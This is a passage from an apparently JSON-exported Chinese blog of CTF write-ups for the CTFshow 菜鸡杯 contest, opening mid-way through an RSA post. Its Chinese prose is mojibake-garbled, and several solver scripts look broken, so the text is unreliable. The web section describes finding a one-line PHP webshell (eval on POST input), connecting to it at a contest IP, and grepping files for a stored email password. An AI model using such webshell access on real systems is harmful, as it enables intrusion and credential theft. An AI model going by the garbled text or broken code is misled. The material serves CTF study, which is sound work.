¹ï¼Œåˆ†åˆ«å¾—åˆ°ä¸€ä¸ªè§£ã€‚å¤§æ¦‚ä¸åˆ°10ç§’ã€‚ ç„¶åå»æ‰¾åˆ°æ‰€æœ‰çš„0x1336ä¸ªprimitive nth root of 1ï¼Œä¹˜ä»¥ä¸Šé¢é‚£ä¸ªè§£ï¼Œå¾—åˆ°æ‰€æœ‰çš„0x1337ä¸ªè§£ã€‚å¤§æ¦‚1åˆ†é’Ÿã€‚ å†ç”¨CRTå¯¹ $GF(p)$ å’Œ $GF(q)$ ä¸Šçš„ä¸¤ç»„0x1337ä¸ªè§£ç»„åˆæˆ $\\bmod n$ ä¸‹çš„è§£ï¼Œå¯ä»¥å¾—åˆ°0x1337**2=24196561ä¸ª $\\bmod n$ çš„è§£ã€‚æœ€åèƒ½é€šè¿‡check()çš„å³ä¸ºflagã€‚å¤§æ¦‚åå‡ åˆ†é’Ÿã€‚ æ­¤é¢˜å¯æ ¹æ®ä¸Šè¿°ç®—æ³•æˆ–åˆ©ç”¨Sageè‡ªå¸¦å‡½æ•°å®ç°è®¡ç®—ã€‚","categories":[{"name":"other","slug":"other","permalink":"https://lazzzaro.github.io/categories/other/"}],"tags":[{"name":"RSA","slug":"RSA","permalink":"https://lazzzaro.github.io/tags/RSA/"}],"author":"Lazzaro"},{"title":"CTFshow èœé¸¡æ¯","slug":"match-CTFshow-èœé¸¡æ¯","date":"2020-08-29T09:58:28.000Z","updated":"2020-08-30T04:35:41.960Z","comments":true,"path":"2020/08/29/match-CTFshow-èœé¸¡æ¯/","permalink":"https://lazzzaro.github.io/2020/08/29/match-CTFshow-%E8%8F%9C%E9%B8%A1%E6%9D%AF/","excerpt":"","text":"â€‹ https://hub.ctfer.com/ ä»»åŠ¡ï¼šæ‰“è´¥äº”å¤§æ´¾é«˜æ‰‹çš„å›´æ”»ï¼Œæœ€åæŒ‘æˆ˜é‚ªæ¶BOSSã€æ²¡æŠ€æœ¯æ˜¯èœé¸¡ã€‘ æ¯”èµ›ï¼šCTFshow èœé¸¡æ¯ (ç®€ç§°ï¼šé¸¡æ¯) å¼€å§‹ï¼š2020/8/29 9:00 ç»“æŸï¼š2020/8/30 9:00 é¢˜ç›®ï¼š web æ‚é¡¹ å¯†ç  é€†å‘ pwn è‹¥å¹²é“ è§„åˆ™ï¼š1 æ¯”èµ›æœŸé—´å¯ä»¥éšæ„è®¨è®ºï¼Œwpé¡»åœ¨æ¯”èµ›ç»“æŸåå‘å¸ƒï¼Œwpç»Ÿä¸€å‘å¸ƒåœ°å€ï¼šhttps://wp.ctf.show2 å…¬å¹³ç«æŠ€ï¼Œç‹¬ç«‹æ¯”èµ›3 æœåŠ¡å™¨ä¸è¦çˆ†ç ´ï¼Œä¸è¦æ”»å‡»æœåŠ¡å™¨ï¼Œä¸è¦æ‰«æ!!!4 å¥–å“ï¼šrankæœ€é«˜çš„å¸ˆå‚…è·å¾—æ­¦æ—ç¥å™¨ï¼šä¸Šå¤é¸¡æ¯ x 1 ï¼Œè·å¾—ç§°å·ï¼šé¸¡æ¯ç‹ ç¬¬ä¸€å…³ Webæ´¾çš„æŒ‘æˆ˜æ‘‡å·å…¥å›­ http://119.28.74.193:28066/ hint:åå°é‡Œé¢æ‰¾é‚®ç®± å‘ç°é¡µé¢æœ‰æŠ¥é”™ï¼Œindex.phpå«ä¸€å¥è¯é©¬eval($_POST[1]); ç›´æ¥ä¸Šèšå‰‘ï¼Œä½¿ç”¨å¯†ç 1è¿æ¥http://119.28.74.193:28066/index.phpï¼Œæ‹¿åˆ°webshellï¼Œæ¥ä¸‹æ¥æ‰¾flagï¼› æŸ¥çœ‹ç›®å½•åˆ—è¡¨æŸ¥çœ‹æœ€è¿‘ä¿®æ”¹çš„æ–‡ä»¶æœªå‘ç°flagï¼Œæ ¹æ®ä¿®æ”¹æ—¥æœŸï¼Œè¿›å…¥å‘½ä»¤è¡Œç”¨findå‘½ä»¤æŒ‰å†…å®¹æœç´¢configå’Œruntimeç›®å½•ï¼š find /var/www/html/config | xargs grep &quot;flag&#123;&quot; find /var/www/html/runtime | xargs grep &quot;flag&#123;&quot; åœ¨/var/www/html/rumtime/log/202008/22.logä¸­æ‰¾åˆ°flagï¼š 123456789(www-data:/var/www/html/runtime) $ find . | xargs grep &quot;flag&#123;&quot;grep: .: Is a directorygrep: ./cache: Is a directorygrep: ./cache/4e: Is a directorygrep: ./temp: Is a directorygrep: ./log: Is a directorygrep: ./log/202008: Is a directory./log/202008/22.log: &#x27;email_password&#x27; =&gt; &#x27;flag&#123;ctf_show_boy&#125;&#x27;,./log/202008/22.log:[ sql ] [ SQL ] UPDATE `kite_site_config` SET `v` = &#x27;flag&#123;ctf_show_boy&#125;&#x27; WHERE `site_id` = 1 AND `k` = &#x27;email_password&#x27; [ RunTime:0.000250s ] â€‹ ç¬¬äºŒå…³ æ‚é¡¹æ´¾çš„æŒ‘æˆ˜çŒå…” https://ctfshow.lanzous.com/imJj4g62dwj pngæ–‡ä»¶ hint: å…”å…”æ•°åˆ— æŸ¥çœ‹16è¿›åˆ¶å‘ç°crcå€¼ä¸åŒ¹é…ï¼Œç”¨pngå›¾ç‰‡å®½é«˜çˆ†ç ´è„šæœ¬å¾—åˆ°æ­£ç¡®é«˜åº¦ï¼ˆæˆ–ç›´æ¥æ”¹å¤§é«˜åº¦ï¼‰ï¼Œä¿®æ”¹å¾—åˆ°æç¤ºï¼š ç»“åˆhintï¼Œå…”å­æ•°åˆ—å³ä¸ºæ–æ³¢é‚£å¥‘æ•°åˆ—ã€‚ ç”¨zstegæŸ¥çœ‹pngå›¾æœ‰æ— éšå†™å†…å®¹ï¼Œå‘ç°lsbæŒ‰åˆ—æå–çš„greenæœ€ä½ä½æœ‰ä¸€ä¸²æ¥è¿‘flagçš„å­—ç¬¦ä¸²ï¼š çœ‹åˆ°å…¶ä¸­flag&#123;äº”ä¸ªå­—ç¬¦ä¸²åˆ†åˆ«å¯¹åº”ç€0,1,2,4,7ä½ï¼ˆåæ–œæ è½¬ä¹‰ï¼‰ï¼Œå·®å€¼ä¸º1,1,2,3åˆšå¥½å¯¹åº”æ–æ³¢é‚£å¥‘æ•°åˆ—å‰å››é¡¹ï¼› ç”¨stegsolve.jarå–å‡ºlsbæŒ‰åˆ—æå–çš„greenæœ€ä½ä½å®Œæ•´å­—ç¬¦ä¸²ï¼Œå­˜binæ–‡ä»¶ï¼š æœ€åç”¨è„šæœ¬æŒ‰æ–æ³¢é‚£å¥‘æ•°åˆ—æ–¹å¼æå–å­—ç¬¦æ‹¼æ¥ï¼š 12345678910111213141516s=open(&#x27;out.bin&#x27;,&#x27;r&#x27;).read()t=[1,1]for i in range(2,100): t.append(t[i-1]+t[i-2])flag=&#x27;&#x27;i=0j=0while j&lt;len(s): if j&gt;=len(s): break ss+=s[j] j+=t[i] i+=1 print(flag) â€‹ åˆéŸ³æœªæ¥-åœ†å‘¨ç‡ä¹‹æ­Œ https://ctfshow.lanzous.com/iq64Jg62egj mp3æ–‡ä»¶ hint1: æ­Œè¯ï¼Œçœ‹çœ‹é‚£é¦–æ­Œæœ€å hint2: ç¦å°”æ‘©æ–¯æœ‰ä¸€ç« è¯´è¿‡ï¼Œè¿™ç§å½¢å¼çš„å¯†æ–‡ ä¸€èˆ¬éƒ½éœ€è¦ä¸€ä¸ªå­—å…¸ã€‚è¿™ç§ç»„åˆï¼Œä¸€èˆ¬è¡¨ç¤º è¦ä¹ˆæ˜¯ å¤šå°‘é¡µçš„ç¬¬å¤šå‡ ä¸ªå•è¯ã€‚ä½†æ˜¯å› ä¸º xxxx æ¯”è¾ƒå¤§ï¼Œä¸€èˆ¬æ²¡æœ‰è¿™ä¹ˆåšçš„ä¹¦ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥è®¤ä¸ºï¼Œä»–æ˜¯ä¸€ä¸ªç°å¸¸é•¿çš„å­—å…¸ï¼Œç„¶åï¼Ÿè¡¨ç¤ºé¡ºåºæˆªå–ï¼Ÿä¸ªå­—ç¬¦ã€‚ audacityæŸ¥çœ‹mp3éŸ³é¢‘æ²¡ä»€ä¹ˆå‘ç°ï¼Œåæ”¾å‡ºä¸¤ä¸ªhintï¼Œæ€è·¯å¾ˆæ˜æ˜¾äº†ã€‚ mp3æ–‡ä»¶æœ€åå†…å®¹ï¼š æ­Œè¯ä¸º10000+ä½ $\\pi$ çš„å€¼ï¼ŒæŒ‰ç…§å…¶ä¸­çš„(a,b)ç»„åˆåˆ†åˆ«ä»æ­Œè¯æå–aä½ç½®å¼€å§‹bé•¿åº¦çš„æ•°å­—ï¼Œå†è½¬æˆå­—ç¬¦å³å¯ã€‚ 1234567891011#f=open(&#x27;pi.mp3&#x27;,&#x27;rb&#x27;).read()[-250:]dic=&#123;2750:3,2535:3,739:2,3487:3,1925:3,451:2,898:2,1479:2,1623:2,1541:2,1232:2,1118:2,1780:2,594:2,2033:2,79:2,1193:2,406:2,1623:2,774:2,1223:2,1351:3&#125;s=&#x27;3.14159265358979323846264338327950288419716939937510582097494459230781640628620899862803482534211706798214808651328230664709384460955058223172535940812848111745028410270193852110555964462294895493038196442881097566593344612847564823378678316527120190914564856692346034861045432664821339360726024914127372458700660631558817488152092096282925409171536436789259036001133053054882046652138414695194151160943305727036575959195309218611738193261179310511854807446237996274956735188575272489122793818301194912983367336244065664308602139494639522473719070217986094370277053921717629317675238467481846766940513200056812714526356082778577134275778960917363717872146844090122495343014654958537105079227968925892354201995611212902196086403441815981362977477130996051870721134999999837297804995105973173281609631859502445945534690830264252230825334468503526193118817101000313783875288658753320838142061717766914730359825349042875546873115956286388235378759375195778185778053217122680661300192787661119590921642019893809525720106548586327886593615338182796823030195203530185296899577362259941389124972177528347913151557485724245415069595082953311686172785588907509838175463746493931925506040092770167113900984882401285836160356370766010471018194295559619894676783744944825537977472684710404753464620804668425906949129331367702898915210475216205696602405803815019351125338243003558764024749647326391419927260426992279678235478163600934172164121992458631503028618297455570674983850549458858692699569092721079750930295532116534498720275596023648066549911988183479775356636980742654252786255181841757467289097777279380008164706001614524919217321721477235014144197356854816136115735255213347574184946843852332390739414333454776241686251898356948556209921922218427255025425688767179049460165346680498862723279178608578438382796797668145410095388378636095068006422512520511739298489608412848862694560424196528502221066118630674427862203919494504712371378696095636437191728746776465757396241389086583264599581339047802759009946576407895126946839835259570982582262052248940772671947826848260147699090264013639443745530506820349625245174939965143142980919065925093722169646151570985838741059788595977297549893016175392846813826868386894277415599185592524595395943104997252468084598727364469584865383673622262609912460805124388439045124413654976278079771569143599770012961608944169486855584840635342207222582848864815845602850601684273945226746767889525213852254995466672782398645659611635488623057745649803559363456817432411251507606947945109659609402522887971089314566913686722874894056010150330861792868092087476091782493858900971490967598526136554978189312978482168299894872265880485756401427047755513237964145152374623436454285844479526586782105114135473573952311342716610213596953623144295248493718711014576540359027993440374200731057853906219838744780847848968332144571386875194350643021845319104848100537061468067491927819119793995206141966342875444064374512371819217999839101591956181467514269123974894090718649423196156794520809514655022523160388193014209376213785595663893778708303906979207734672217256259966150142150306803844773454920260541466592520149744285073251866600213243408819071048633173464965145390579626856100550810665879699816357473638405257145910289706414011097120628043903975951567715770042033786993600723055876317635942187312514712053292819182618612586732157919841484882916447060957527069572209175671167229109816909152801735067127485832228718352093539657251210835791513698820914442100675103346711031412671113699086585163983150197016515116851714376576183515565088490998985998238734552833163550764791853589322618548963213293308985706420467525907091548141654985946163718027098199430992448895757128289059232332609729971208443357326548938239119325974636673058360414281388303203824903758985243744170291327656180937734440307074692112019130203303801976211011004492932151608424448596376698389522868478312355265821314495768572624334418930396864262434107732269780280731891544110104468232527162010526522721116603966655730925471105578537634668206531098965269186205647693125705863566201855810072936065987648611791045334885034611365768675324944166803962657978771855608455296541266540853061434443185867697514566140680070023787765913440171274947042056223053899456131407112700040785473326993908145466464588079727082668306343285878569830523580893306575740679545716377525420211495576158140025012622859413021647155097925923099079654737612551765675135751782966645477917450112996148903046399471329621073404375189573596145890193897131117904297828564750320319869151402870808599048010941214722131794764777262241425485454033215718530614228813758504306332175182979866223717215916077166925474873898665494945011465406284336639379003976926567214638530673609657120918076383271664162748888007869256029022847210403172118608204190004229661711963779213375751149595015660496318629472654736425230817703675159067350235072835405670403867435136222247715891504953098444893330963408780769325993978054193414473774418426312986080998886874132604721569516239658645730216315981931951673538129741677294786724229246543668009806769282382806899640048243540370141631496589794092432378969070697794223625082216889573837986230015937764716512289357860158816175578297352334460428151262720373431465319777741603199066554187639792933441952154134189948544473456738316249934191318148092777710386387734317720754565453220777092120190516609628049092636019759882816133231666365286193266863360627356763035447762803504507772355471058595487027908143562401451718062464362679456127531813407833033625423278394497538243720583531147711992606381334677687969597030983391307710987040859133746414428227726346594704745878477872019277152807317679077071572134447306057007334924369311383504931631284042512192565179806941135280131470130478164378851852909285452011658393419656213491434159562586586557055269049652098580338507224264829397285847831630577775606888764462482468579260395352773480304802900587607582510474709164396136267604492562742042083208566119062545433721315359584506877246029016187667952406163425225771954291629919306455377991403734043287526288896399587947572917464263574552540790914513571113694109119393251910760208252026187985318877058429725916778131496990090192116971737278476847268608490033770242429165130050051683233643503895170298939223345172201381280696501178440874519601212285993716231301711444846409038906449544400619869075485160263275052983491874078668088183385102283345085048608250393021332197155184306354550076682829493041377655279397517546139539846833936383047461199665385815384205685338621867252334028308711232827892125077126294632295639898989358211674562701021835646220134967151881909730381198004973407239610368540664319395097901906996395524530054505806855019567302292191393391856803449039820595510022635353619204199474553859381023439554495977837790237421617271117236434354394782218185286240851400666044332588856986705431547069657474585503323233421073015459405165537906866273337995851156257843229882737231989875714159578111963583300594087306812160287649628674460477464915995054973742562690104903778198683593814657412680492564879855614537234786733039046883834363465537949864192705638729317487233208376011230299113679386270894387993620162951541337142489283072201269014754668476535761647737946752004907571555278196536213239264061601363581559074220202031872776052772190055614842555187925303435139844253223415762336106425063904975008656271095359194658975141310348227693062474353632569160781547818115284366795706110861533150445212747392454494542368288606134084148637767009612071512491404302725386076482363414334623518975766452164137679690314950191085759844239198629164219399490723623464684411739403265918404437805133389452574239950829659122850855582157250310712570126683024029295252201187267675622041542051618416348475651699981161410100299607838690929160302884002691041407928862150784245167090870006992821206604183718065355672525325675328612910424877618258297651579598470356222629348600341587229805349896502262917487882027342092222453398562647669149055628425039127577102840279980663658254889264880254566101729670266407655904290994568150652653053718294127033693137851786090407086671149655834343476933857817113864558736781230145876871266034891390956200993936103102916161528813843790990423174733639480457593149314052976347574811935670911013775172100803155902485309066920376719220332290943346768514221447737939375170344366199104033751117354719185504644902636551281622882446257591633303910722538374218214088350865739177150968288747826569959957449066175834413752239709683408005355984917541738188399944697486762655165827658483588453142775687900290951702835297163445621296404352311760066510124120065975585127617858382920419748442360800719304576189323492292796501987518721272675079812554709589045563579212210333466974992356302549478024901141952123828153091140790738602515227429958180724716259166854513331239480494707911915326734302824418604142636395480004480026704962482017928964766975831832713142517029692348896276684403232609275249603579964692565049368183609003238092934595889706953653494060340216654437558900456328822505452556405644824651518754711962184439658253375438856909411303150952617937800297412076651479394259029896959469955657612186561967337862362561252163208628692221032748892186543648022967807057656151446320469279068212073883778142335628236089632080682224680122482611771858963814091839036736722208883215137556003727983940041529700287830766709444745601345564172543709069793961225714298946715435784687886144458123145935719849225284716050492212424701412147805734551050080190869960330276347870810817545011930714122339086639383395294257869050764310063835198343893415961318543475464955697810382930971646514384070070736041123735998434522516105070270562352660127648483084076118301305279320542746286540360367453286510570658748822569815793678976697422057505968344086973502014102067235850200724522563265134105592401902742162484391403599895353945909440704691209140938700126456001623742880210927645793106579229552498872758461012648369998922569596881592056001016552563756785667227966198857827948488558343975187445455129656344348039664205579829368043522027709842942325330225763418070394769941597915945300697521482933665556615678736400536665641654732170439035213295435291694145990416087532018683793702348886894791&#x27;flag=&#x27;&#x27;for k,v in dic.items(): flag+=chr(int(s[k:k+v])) print(flag) â€‹ å·®ä¸€ç‚¹ https://ctfshow.lanzous.com/iNbACg62edg Itâ€™s so easy,you can trytrysee. JSFUCKç¼–ç ï¼Œå»æ‰æœ€åçš„()ï¼Œåœ¨æµè§ˆå™¨Consoleä¸­è¿è¡Œå¾—flagã€‚ â€‹ ç¬¬ä¸‰å…³ CRYPTOæ´¾çš„æŒ‘æˆ˜æˆ‘ä»¬ä¸åƒè¤ https://hub.ctfer.com/file/crypto1.zip åªæœ‰äºŒè¿›åˆ¶çš„ä¸–ç•Œæ˜¯ä¸æ˜¯æœ‰äº›æ— èŠ æŸ¥çœ‹æ–‡ä»¶ï¼Œåªæœ‰0,1,2ä¸‰ç§æ•°å­—ï¼ŒçŒœæµ‹ä¸º3è¿›åˆ¶ï¼Œè½¬æ¢ä¸º16è¿›åˆ¶åï¼Œå‡ºç°å¤šä¸ª3Xæ¨¡å¼çš„å­ä¸²ï¼ŒçŒœæµ‹è½¬ä¸ºå­—ç¬¦ï¼›è½¬æ¢ååˆæœ‰0,1,2,3,4å››ä¸­æ•°å­—ï¼ŒçŒœæµ‹ä¸º5è¿›åˆ¶ï¼Œè½¬æ¢ä¸º16è¿›åˆ¶åï¼Œåˆå‡ºç°å¤šä¸ª3Xæ¨¡å¼çš„å­ä¸²â€¦â€¦ ä¸æ–­å°è¯•å‘ç°è§„å¾‹ï¼Œéœ€è¦è½¬æ¢çš„è¿›åˆ¶å‡ä¸ºç´ æ•°è¿›åˆ¶ï¼ˆä¸åƒè¤ï¼Ÿï¼‰ã€‚ä¸­é—´éœ€è¦ä¸æ–­å°è¯•è¾“å‡ºç»“æœä»¥ç¡®å®šè¿›åˆ¶æ•°ï¼Œæ³¨æ„int()å‡½æ•°çš„ç¬¬äºŒå‚æ•°ä»…æ”¯æŒ36åŠä»¥ä¸‹æ•°å€¼çš„è½¬æ¢ï¼Œå¤§äº36çš„æƒ…å†µéœ€è¦è‡ªè¡Œå®ç°è¿›åˆ¶è½¬æ¢å‡½æ•°change()ã€‚è„šæœ¬è§£ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990s=open(&#x27;c.txt&#x27;,&#x27;r&#x27;).read()s=int(s,3)s=hex(s)[2:]s=bytes.fromhex(s).decode()s=int(s,5)s=hex(s)[2:]s=bytes.fromhex(s).decode()s=int(s,7)s=hex(s)[2:]s=bytes.fromhex(s).decode()s=int(s,11)s=hex(s)[2:]s=bytes.fromhex(s).decode()s=int(s,13)s=hex(s)[2:]s=bytes.fromhex(s).decode()s=int(s,17)s=hex(s)[2:]s=bytes.fromhex(s).decode()s=int(s,19)s=hex(s)[2:]s=bytes.fromhex(s).decode()s=int(s,23)s=hex(s)[2:]s=bytes.fromhex(s).decode()s=int(s,29)s=hex(s)[2:]s=bytes.fromhex(s).decode()s=int(s,31)s=hex(s)[2:]s=bytes.fromhex(s).decode()#intä¸æ”¯æŒk&gt;36dic=&#123;&#125;for i in range(10): dic[chr(ord(&#x27;0&#x27;)+i)]=ifor i in range(26): dic[chr(ord(&#x27;a&#x27;)+i)]=i+10for i in range(26): dic[chr(ord(&#x27;A&#x27;)+i)]=i+10+26print(dic)def change(s,k): j=0 res=0 for i in range(len(s)): res+=dic[s[len(s)-i-1]]*pow(k,j) j+=1 return res s=change(s,37)s=hex(s)[2:]s=bytes.fromhex(s).decode()s=change(s,41)s=hex(s)[2:]s=bytes.fromhex(s).decode()s=change(s,43)s=hex(s)[2:]s=bytes.fromhex(s).decode()s=change(s,47)s=hex(s)[2:]s=bytes.fromhex(s).decode()s=change(s,53)s=hex(s)[2:]s=bytes.fromhex(s).decode()s=change(s,59)s=hex(s)[2:]s=bytes.fromhex(s).decode()s=change(s,61)s=hex(s)[2:]s=bytes.fromhex(s).decode()#flagprint(s) â€‹ å¤©ä»™é‡‘ä¸¹å¿ƒæ³• https://hub.ctfer.com/file/crypto2.zip é“åœ¨å±æºº â—‹ é¡»è¦ï¼šæ¬¡æƒ³æŠŠå¸¸é¢çŸ¥æœ¬ç”¨éƒ½éƒ¨é“æ–‡å“ˆæ˜¯ç”¨å·²æœ¬è¿å¸Œæ— æ¥æ¯”å‡€é¢˜ç»­å³ç”¨å‡‘å¦‚å¦™é“å¯†è¿›å¯çš„å­—çœŸæ³•åœ¨æµ·ç è¡Œï¼šâ—‹ æ•°ç­è‡ªå±å‡¡å™¨åªä¸‰åå…¨è€Œç¥ç„¶æººé¼å½’å¿ƒ æŸ¥è¯¢çŸ¥æ­¤ä¸ºä¸­æ–‡æ …æ è§£å¯†ï¼Œä¸”æ¯ä¸€æ é€’å¢ï¼Œè¿˜åŸï¼š ç«–ç€è¯»ï¼Œç”¨å¸¸è§md5è®¡ç®—ä¸‰æ¬¡å³ä¸ºflagã€‚ 123456789from hashlib import md5s=open(&#x27;é¢˜ç›®.txt&#x27;,&#x27;rb&#x27;).read()s=md5(s).hexdigest()s=md5(s.encode()).hexdigest()s=md5(s.encode()).hexdigest()print(s)open(&#x27;out.txt&#x27;,&#x27;w&#x27;).write(s) â€‹ Knapsack My Number Theory Book https://hub.ctfer.com/file/crypto3.zip hint1: 1112222333333 mod (10^7)=2333333hint2: Knapsack Cryptosystem æœ‰æœºä¼šå‚ä¸Cryptoçš„å‹è½´é¢˜å‡ºé¢˜~~ ä¸è¿‡å¥½åƒæ²¡æœ‰äººç¢°= = å…¶å®è¿™é¢˜æ˜¯ä¸€ä¸ªæ•°è®ºé¢˜ä¸èƒŒåŒ…åŠ å¯†ç³»ç»Ÿçš„å¥—å¨ƒé¢˜ã€‚ æºä»£ç ï¼š 123456789101112131415161718192021222324252627from json import dumpfrom random import SystemRandomfrom hashlib import *random = SystemRandom()k, n, d = 15, 40, 0.4B = 2**(n//d)A = [random.randint(1, B) for _ in range(n)]s = sum(A[index] for index in random.sample(range(n), k))part = int(str(int.from_bytes(str(s).encode(), byteorder=&#x27;little&#x27;) &lt;&lt; 10000)[-175:])dump((A,part), open(&quot;data&quot;, &quot;w&quot;))print(s)print(part)inp = input(&quot;Please input the solution (0, 1, 0, 1, ...): &quot;)sol = [int(i) for i in inp.split(&#x27;,&#x27;)]assert sum(i == 1 for i in sol) == kassert len(sol) == nassert all(i == 0 or i == 1 for i in sol)if sum(x*a for x, a in zip(sol, A)) == s: m = md5(&#x27;&#x27;.join(str(i) for i in sol).encode()).hexdigest() print(f&quot;TQL!! flag is &#123;m.join([&#x27;flag&#123;&#x27;, &#x27;&#125;&#x27;])&#125;&quot;) å¤–å±‚æ˜¯ $n=40,k=15,d=0.4$ çš„èƒŒåŒ…å¯†ç ç³»ç»Ÿï¼Œå³40ç»´å­é›†å’Œé—®é¢˜ï¼Œè§£å‘é‡é‡é‡ä¸º15ï¼ŒèƒŒåŒ…å¯†åº¦ä¸º0.4ï¼ˆ40é•¿åº¦çš„01è§£å‘é‡æ•°ç»„ä¸­å«15ä¸ª1ï¼‰ï¼› å†…å±‚æ˜¯éœ€è¦ä¸€ç‚¹æ•°è®ºçŸ¥è¯†æ‰èƒ½ä»partæ±‚è§£å‡ºçš„sï¼Œå³å­é›†å’Œçš„å€¼ï¼› æ±‚è§£å‡º01è§£å‘é‡ç»„æˆçš„å­—ç¬¦ä¸²md5å“ˆå¸Œå€¼å³ä¸ºflagã€‚ å†…å±‚ int.from_bytes(bytes, byteorder, *, signed=False) å¯å®ç°ä¸å›ºå®šé•¿åº¦çš„bytesç±»å‹æ•°æ®è½¬intç±»å‹æ•°æ®ï¼Œbyteorderæ ‡å¿—å°å­—èŠ‚é¡ºåºè¿˜æ˜¯å¤§å­—èŠ‚é¡ºåº æ ¹æ®partå€¼è¿˜åŸså€¼ï¼Œå…¶ä¸­byteorder=&#39;little&#39;ä»£è¡¨å°ç«¯åºï¼ˆååºï¼‰ï¼Œå‡è®¾ $t$ ä¸º $s$ ååºå­—ç¬¦ä¸²å¯¹åº”çš„intå€¼ï¼Œ$p$ ä¸ºpartå€¼ï¼Œæ ¹æ®å·²çŸ¥å…³ç³»æœ‰ï¼š tå·¦ç§»10000ä½åå175ä½å€¼ä¸ºpartã€‚ å›  $a&lt;&lt;b \\Rightarrow a\\cdot 2^b$ ï¼Œæ•… $t&lt;&lt;10000 \\Rightarrow t\\cdot 2^{10000}$ï¼Œåˆ $t\\cdot 2^{10000}$ ä»¥ 175ä½çš„ $p$ ç»“å°¾ï¼Œå³ï¼š $p = (t\\cdot 2^{10000}) \\bmod (10^{175})$ ä½†æ­¤æ—¶ä¸èƒ½ç›´æ¥åº”ç”¨æ¨¡é€†è¿ç®—è®¡ç®—å‡º $t$ ï¼Œå› ä¸º $\\gcd(2^{10000},10^{175}) \\neq 1$ï¼› åšä¸€ä¸‹è½¬æ¢ï¼š $p \\equiv (t\\cdot 2^{10000}) \\pmod {10^{175}} \\ \\Rightarrow t\\cdot 2^{10000}=x\\cdot 10^{175}+p$ åˆ†è§£ $p$ å‘ç°ï¼š $p=2^{176} \\cdot 3 \\cdot 43973 \\cdot 69653 \\cdot 6642192645148709014118321101167435034612406484841133642520224597359790421504311588434603251039359463852561066413$ è®¾ $y=\\cfrac{p}{2^{175}}$ï¼Œåˆ™ $t\\cdot 2^{10000}=x\\cdot 10^{175}+2^{175}\\cdot y \\ \\Rightarrow t\\cdot 2^{9825}=x\\cdot 5^{175}+ y \\ \\Rightarrow y \\equiv t \\cdot 2^{9825} \\pmod {5^{175}} \\ \\Rightarrow y \\cdot (2^{9825})^{-1} \\equiv t \\pmod {5^{175}}$ é€šè¿‡æ±‚æ¨¡é€†å¯è¿˜åŸ $t$ ï¼Œå†è¿˜åŸå‡º $s$ã€‚ 123456789101112131415from gmpy2 import invertn = pow(5,175)p = 5845718273413614238047854434058144506973237928951593664100212455023083304425941087047510727554535833686148194478724602632928856425119454505382766186798132132909079456410238976y = p // pow(2,175)k = pow(2, 9825, n)kinv = int(invert(k, n))t = (y * kinv) % nprint(t)#t=int.from_bytes(str(s).encode(), byteorder=&#x27;little&#x27;)s = int(bytes.fromhex(hex(t)[2:])[::-1])print(s)#sum å¤–å±‚ å°è§„æ¨¡çš„èƒŒåŒ…å¯†ç ç³»ç»Ÿï¼Œå¯ä»¥ç›´æ¥ç”¨å¸¸è§LLLç®—æ³•æ”»å‡»ï¼Œå‚è€ƒï¼š https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/knapsack/knapsack-zh/ Sageè„šæœ¬ï¼š 123456789101112131415161718192021222324252627282930313233import binascii# open the public key and strip the spaces so we have a decent arraypubKey = [291261609902039997017727282042, 323900844596016068072642445649, 266988452026099177894210813748, 408729576966214254532209048947, 437048374902001262457529358416, 45441859606116873131092743344, 51312372228432799205402860932, 446894113383896613780223791057, 387275979896657368942582580348, 106191812735537081768832792472, 314442025322217482482346876963, 458938676660836185669115411856, 624514817837775109409742774239, 223466848034665041761802574065, 317380931967330048573366834100, 305525458686341075758884485721, 477363540414430757340867483621, 538724147876064506850294590869, 147986153711350097748394541291, 237604431565908226570207609923, 168061497374145289079315904395, 226257393036905506618868519191, 606131084939410793557726750445, 229847073637282132507525425264, 189589107972678036785075475201, 258811229764745601613575317649, 188968262675983804863009858052, 594623692847436704500625622597, 494291994428984378953385211372, 602493249658184503910046469358, 196950288482747513670119067849, 300975486828861896159703499663, 606100573531309594132334686576, 330763266814750730387569732411, 169247067050997623804446808122, 488060887558585221461996453780, 235957723689777110563629411239, 617280674032071480762572507845, 1187994588804681817349174099, 286948311141611416450158085330]nbit = len(pubKey)# open the encoded messageencoded = 4823023867810203947898718813977print(&quot;start&quot;)# create a large matrix of 0&#x27;s (dimensions are public key length +1)A = Matrix(ZZ, nbit + 1, nbit + 1)# fill in the identity matrixfor i in range(nbit): A[i, i] = 1# replace the bottom row with your public keyfor i in range(nbit): A[i, nbit] = pubKey[i]# last element is the encoded messageA[nbit, nbit] = -int(encoded)res = A.LLL()for i in range(0, nbit + 1): # print solution M = res.row(i).list() flag = True for m in M: if m != 0 and m != 1: flag = False break if flag: print(i, M) M = &#x27;&#x27;.join(str(j) for j in M) # remove the last bit M = M[:-1] print(&#x27;&#x27;.join([str(i) for i in M])) â€‹ ç¬¬å››å…³ é€†å‘æ´¾çš„æŒ‘æˆ˜ç¬¬äº”å…³ èƒ–æ´¾çš„æŒ‘æˆ˜ å¼±é¸¡ç•¥è¿‡Hard Re+PWN~ â€‹ ç¬¬å…­å…³ æ²¡æŠ€æœ¯æ˜¯èœé¸¡å¤§é­”ç‹æœ€èœçš„boss https://hub.ctfer.com/file/boss.zip èœé¸¡ä¸­çš„æˆ˜æ–—æœº æºç ï¼š 12345678import wmiimport timefor i in [&#x27;N&#x27;,&#x27;B&#x27;,&#x27;N&#x27;,&#x27;B&#x27;,&#x27;N&#x27;,&#x27;B&#x27;,&#x27;N&#x27;,&#x27;B&#x27;,&#x27;N&#x27;,&#x27;B&#x27;,&#x27;B&#x27;,&#x27;B&#x27;,&#x27;N&#x27;,&#x27;B&#x27;,&#x27;B&#x27;,&#x27;B&#x27;,&#x27;N&#x27;,&#x27;B&#x27;,&#x27;B&#x27;,&#x27;N&#x27;,&#x27;B&#x27;,&#x27;N&#x27;,&#x27;N&#x27;,&#x27;B&#x27;,&#x27;N&#x27;,&#x27;B&#x27;,&#x27;B&#x27;,&#x27;N&#x27;,&#x27;B&#x27;,&#x27;B&#x27;,&#x27;B&#x27;,&#x27;N&#x27;]: wmi.WMI(namespace=&#x27;root\\WMI&#x27;).WmiMonitorBrightnessMethods()[0].WmiSetBrightness(Brightness=ord(i), Timeout=500) time.sleep(char(&#x27;!&#x27;))#èœé¸¡ä¸­çš„BOSSï¼Œç®€ç§°èœåŒ…ä¸ æ— 